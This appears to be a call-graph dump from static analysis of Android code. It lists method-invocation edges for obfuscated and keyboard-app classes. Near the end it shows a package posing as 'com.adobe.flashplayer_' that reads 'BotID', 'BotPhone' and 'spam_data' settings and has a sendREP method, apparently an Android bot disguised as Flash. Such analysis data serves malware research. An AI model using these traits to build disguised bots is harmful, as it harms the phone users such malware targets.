SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gcs: void <init>(hbv,lma,int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<lsn: void ab(java.lang.String,java.lang.Object[])>($r1, $r4) in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: void ab(java.lang.String,java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<liy: void <init>(ljd)>(r0) in <ljd: java.util.Set entrySet()> ==> <liy: void <init>(ljd)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r9) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
SPECIAL edge: specialinvoke $r0.<lkm: void <init>(lkq,int)>($r1, 0) in <lkq: void <clinit>()> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lqq: void <init>(java.lang.Object,java.lang.Object[],int)>(null, $r1, 0) in <lqq: void <clinit>()> ==> <lqq: void <init>(java.lang.Object,java.lang.Object[],int)>
CLINIT edge: staticinvoke <bel: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <bel: void <clinit>()>
SPECIAL edge: specialinvoke $r4.<oru: void <init>()>() in <ose: void <clinit>()> ==> <oru: void <init>()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lly: lma g()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: java.lang.String b()>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r1, $i0) in <qj: int b(java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lkl: lkq g()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r3.<ltc: void <init>(java.lang.String,int,int)>("LARGE", 2, 50) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r1.<gsv: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <gsv: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Object: java.lang.Class getClass()>() in <lvs: lvs a(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(19) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r2 = staticinvoke <lkq: lkq q()>() in <lqs: void <clinit>()> ==> <lkq: lkq q()>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(12) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke r0.<lje: void a()>() in <lje: java.lang.Object next()> ==> <lje: void a()>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <ivw: boolean z(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<hcb: void <init>()>() in <hcb: void <clinit>()> ==> <hcb: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r12.<lts: java.lang.Object d(lsz)>($r13) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsm: java.lang.Object d(lsz)>
STATIC edge: $r0 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r1, $i0) in <lkq: lkq g(java.lang.Object[])> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>(int)>(3) in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>(int)>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r0, $i0, $i1, 97, 122, $i2) in <iwt: void g(char[],int,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", parameter ") in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <mag: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r4.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_FULL_IMAGE", 4, 4) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lli: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r2 = staticinvoke <android.util.Base64: java.lang.String encodeToString(byte[],int)>($r1, 3) in <kes: java.lang.String k(nfe)> ==> <android.util.Base64: java.lang.String encodeToString(byte[],int)>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<ljb: void a()>() in <ljb: java.lang.Object getValue()> ==> <ljb: void a()>
STATIC edge: $z0 = staticinvoke <iwt: boolean o(char)>($c0) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: boolean o(char)>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
CLINIT edge: staticinvoke <lql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lql: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lta: void <init>(lsr,java.lang.Object)> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <hef: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hef: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lvq: int b()>() in <lvq: int size()> ==> <lvq: int b()>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <lsm: void <init>()> ==> <lts: void <init>()>
SPECIAL edge: specialinvoke $r27.<mag: void <init>(java.lang.String,int,int)>("TENOR_FEATURED_METADATA", 27, 27) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ivv: java.lang.String c()>() in <ivv: ivw a()> ==> <ivv: java.lang.String c()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lup: void <init>(lwc,java.lang.String)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <ojg: void v(java.lang.String)>($r1) in <ojg: void d(java.lang.Object,java.lang.String)> ==> <ojg: void v(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
CLINIT edge: staticinvoke <lkx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkx: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lkg: void <init>(int)>(4) in <lkl: void <init>()> ==> <lkg: void <init>(int)>
CLINIT edge: staticinvoke <jvu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jvu: void <clinit>()>
VIRTUAL edge: $r4 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>($r3) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.Class: java.lang.reflect.Field getDeclaredField(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(1) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $i8 = interfaceinvoke $r14.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r9, $r15) in <lvr: void <init>(lvr,lvr)> ==> <jlu: int compare(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Uncategorized", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_ImeListLoaded", $r4) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lfc: void <init>(lfa)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.StringBuilder: int length()>() in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: int length()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i0, $i4) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r5, $i0) in <lvr: void <init>(lvr,lvr)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
CLINIT edge: staticinvoke <lqr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqr: void <clinit>()>
INTERFACE edge: $r7 = interfaceinvoke $r2.<ltn: lsq f()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: lsq f()>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r1 = staticinvoke <lri: java.util.ArrayList N()>() in <lri: java.util.ArrayList P(java.util.Iterator)> ==> <lri: java.util.ArrayList N()>
CLINIT edge: staticinvoke <iej: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iej: void <clinit>()>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.LinkageError: void <init>()> ==> <java.lang.Error: void <init>()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r1, $r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jvu: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r7 = virtualinvoke $r0.<hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>($r1, $r2, $r3, $r6) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: hbv j(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(4) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
INTERFACE edge: interfaceinvoke $r1.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r4, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(float[],float[])>($r14, $r15) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(float[],float[])>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqm: int size()>
VIRTUAL edge: $r5 = virtualinvoke $r7.<lsm: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
VIRTUAL edge: $c0 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: char charAt(int)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("Autocomplete", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r0.<jvu: void <init>(int)>(1) in <jvu: void <clinit>()> ==> <jvu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <ojg: void h(java.lang.Throwable)>($r2) in <ojg: void c(java.lang.Object,java.lang.String)> ==> <ojg: void h(java.lang.Throwable)>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lkl: void h(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("].") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lvs: lvs a(java.lang.Object)>($r2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <lvs: lvs a(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Exception: void <init>(java.lang.String,java.lang.Throwable)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean t(char[],int,int)>($r3, $i1, 4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean t(char[],int,int)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r4, $i0, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r11.<lvt: void <init>(lvr)>($r15) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: void <init>(lvr)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r2, $i2, 0, $i0) in <j$.util.concurrent.ConcurrentHashMap: int hashCode()> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
CLINIT edge: staticinvoke <j$.util.concurrent.r: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.r: void <clinit>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i2 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(2) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("cause", class "Ljava/lang/Throwable;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Class: boolean isAssignableFrom(java.lang.Class)>($r4) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: boolean isAssignableFrom(java.lang.Class)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(10) in <lvr: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(2) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r3 = staticinvoke <java.lang.Long: java.lang.Long valueOf(long)>($l0) in <hbu: hbs f(java.lang.String,long)> ==> <java.lang.Long: java.lang.Long valueOf(long)>
SPECIAL edge: specialinvoke $r5.<hno: void <init>()>() in <hnt: void <clinit>()> ==> <hno: void <init>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(13) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: int hashCode()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.StringBuilder: java.lang.String toString()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<lsh: void <init>(lto)>($r2) in <lsh: lsh j(java.lang.String)> ==> <lsh: void <init>(lto)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int)>($i1) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <lje: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: $r16 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotID") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1) in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void onCreate(android.os.Bundle)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r30 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("spam_data", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r19 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void onCreate()>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void <init>()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashW: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
